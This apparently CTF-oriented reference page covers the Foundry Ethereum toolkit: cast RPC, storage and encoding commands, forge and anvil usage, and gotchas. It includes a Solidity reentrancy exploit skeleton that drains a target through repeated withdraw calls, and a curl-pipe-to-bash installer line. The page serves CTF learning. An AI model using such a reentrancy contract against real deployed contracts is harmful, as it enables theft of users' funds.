---
title: "Tool - Foundry (cast / forge / anvil)"
category: blockchain
subcategory: ethereum
type: tool
tags: [foundry, cast, forge, anvil, ethereum, solidity, evm, rpc, blockchain, web3, smart-contract, storage-slot, calldata, fork, paradigm-ctf]
summary: "The Rust Ethereum toolkit: cast for RPC calls and encoding, forge for writing exploit contracts, anvil for a local forked chain."
related: [web3-audit, remote-service, source-code-given]
---

## What it is

Foundry is the standard toolchain for Ethereum CTF challenges:
- **cast** - a CLI for every RPC operation: read storage, call functions, send transactions, encode/decode calldata, convert units.
- **forge** - build, test and script Solidity; write your exploit as a contract and deploy it.
- **anvil** - a local EVM node, optionally forked from a live chain, for testing an exploit before spending the real attempt.
- **chisel** - a Solidity REPL.

## Install

```sh
curl -L https://foundry.paradigm.xyz | bash
foundryup
# verify
cast --version; forge --version; anvil --version
```

## The invocations that matter

Typical blockchain CTF setup: a TCP service gives you an RPC URL, a private key, a setup-contract address and a target address.

```sh
export RPC=http://chal.ctf:8545
export PK=0xabc...                       # your private key
export ME=$(cast wallet address $PK)
export TARGET=0x...                      # the challenge contract

# 1. chain and account basics
cast chain-id --rpc-url $RPC
cast balance $ME --rpc-url $RPC
cast block latest --rpc-url $RPC

# 2. read contract state without a transaction
cast call $TARGET "isSolved()(bool)" --rpc-url $RPC
cast call $TARGET "owner()(address)" --rpc-url $RPC
cast call $TARGET "balanceOf(address)(uint256)" $ME --rpc-url $RPC

# 3. read raw storage slots (private variables are not private)
cast storage $TARGET 0 --rpc-url $RPC
cast storage $TARGET 1 --rpc-url $RPC
for i in $(seq 0 10); do echo "slot $i: $(cast storage $TARGET $i --rpc-url $RPC)"; done
# mapping slot: keccak256(abi.encode(key, slot))
cast index address $ME 2                 # computes the slot for mapping at slot 2
# dynamic array element: keccak256(slot) + index

# 4. send a transaction
cast send $TARGET "solve(uint256)" 42 --private-key $PK --rpc-url $RPC
cast send $TARGET "deposit()" --value 1ether --private-key $PK --rpc-url $RPC
cast send $TARGET --private-key $PK --rpc-url $RPC   # plain ETH transfer

# 5. encoding and decoding
cast sig "transfer(address,uint256)"                 # 4-byte selector
cast calldata "transfer(address,uint256)" $ME 100
cast abi-decode "balanceOf(address)(uint256)" 0x00..
cast 4byte 0xa9059cbb                                # reverse a selector
cast keccak "some string"
cast --to-dec 0xff; cast --to-hex 255
cast --to-wei 1 ether; cast --from-wei 1000000000000000000

# 6. inspect deployed bytecode
cast code $TARGET --rpc-url $RPC
cast code $TARGET --rpc-url $RPC | tee code.hex
cast disassemble $(cast code $TARGET --rpc-url $RPC)

# 7. transaction and trace inspection
cast tx 0x<hash> --rpc-url $RPC
cast receipt 0x<hash> --rpc-url $RPC
cast run 0x<hash> --rpc-url $RPC --trace-printer   # replay with a full trace
cast logs --from-block 0 --address $TARGET --rpc-url $RPC

# 8. forge: write the exploit as a contract
forge init exploit && cd exploit
# put Exploit.sol in src/, then:
forge build
forge create src/Exploit.sol:Exploit --private-key $PK --rpc-url $RPC --constructor-args $TARGET
forge script script/Solve.s.sol --rpc-url $RPC --private-key $PK --broadcast

# 9. anvil: a local fork to test against, free and repeatable
anvil --fork-url $RPC
anvil --fork-url $RPC --fork-block-number 12345
# anvil prints 10 funded accounts and their keys; use those locally
cast rpc anvil_setBalance $ME 0xde0b6b3a7640000 --rpc-url http://127.0.0.1:8545
cast rpc anvil_impersonateAccount 0xvictim --rpc-url http://127.0.0.1:8545

# 10. forge test as an exploit harness (the cleanest way to iterate)
forge test --fork-url $RPC -vvvv --match-test testExploit
```

An exploit-contract skeleton:
```solidity
// src/Exploit.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITarget {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function isSolved() external view returns (bool);
}

contract Exploit {
    ITarget public target;
    uint256 private depth;

    constructor(address _target) payable {
        target = ITarget(_target);
    }

    function attack() external payable {
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }

    // reentrancy hook
    receive() external payable {
        if (depth < 5 && address(target).balance >= 1 ether) {
            depth++;
            target.withdraw(1 ether);
        }
    }
}
```

## Gotchas

- **Always test against `anvil --fork-url $RPC` first.** Many challenges give you a limited number of attempts or a single instance; burning it on an untested exploit is the classic mistake.
- Function signatures in `cast call` need the **return types** in parentheses to be decoded: `"owner()(address)"`, not `"owner()"`.
- `cast call` is a simulation (no state change, no gas); `cast send` is a real transaction. Read-only checks with `send` waste gas and time.
- `private` in Solidity means "not readable by other contracts", **not** secret. `cast storage` reads any slot.
- Storage layout: value types pack into 32-byte slots in declaration order; mappings live at `keccak256(key . slot)`; dynamic arrays store the length at `slot` and the data at `keccak256(slot)`.
- `cast send` needs either `--private-key`, `--mnemonic`, or an unlocked account; and `--rpc-url` on every call (or set `ETH_RPC_URL`).
- Gas: set `--gas-limit` manually when estimation fails (it fails for reverting or reentrant calls).
- `tx.origin` vs `msg.sender`: if the challenge checks `tx.origin == msg.sender`, you cannot call through a contract.
- `block.timestamp` and `blockhash` are manipulable by whoever mines; on a private CTF chain you may control block production via `anvil_mine`.
- Solidity version matters: `^0.8.0` has built-in overflow checks; `<0.8.0` does not, and `unchecked{}` blocks disable them again.

## If it fails, use instead

| Situation | Alternative |
|---|---|
| You prefer Python | `web3.py` - full RPC access, easy scripting |
| You prefer JS | `ethers.js`, Hardhat |
| Decompiling bytecode | `heimdall-rs`, `panoramix`, `ethervm.io`-style decompilers |
| Static analysis of source | `slither`, `mythril`, `echidna` (fuzzing) |
| Symbolic execution on EVM | `halmos`, `mythril`, `manticore` |
| Interacting through a browser wallet | the challenge's own web UI, if provided |
| Non-EVM chains | the chain's own SDK; Foundry is Ethereum-only |
